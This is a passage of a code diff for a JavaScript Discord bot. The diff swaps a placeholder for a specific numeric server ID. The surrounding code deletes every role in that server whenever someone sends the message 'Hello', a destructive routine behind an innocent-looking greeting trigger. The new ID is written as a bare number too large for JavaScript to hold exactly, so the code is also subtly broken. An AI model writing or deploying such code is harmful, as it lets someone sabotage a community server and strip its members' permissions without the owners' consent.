@@ -7,7 +7,7 @@ client.on("ready", () => {
 
 client.on("message", (message) => {
 
-  var server = Client.guilds.get('Your servers ID'); //Check Discord's Help For it
+  var server = Client.guilds.get(801058277697126400); //Check Discord's Help For it
   if (message == "Hello"){
     for (var i = 0; i < server.roles.array().length; i++) {
       server.roles.array()[i].delete();
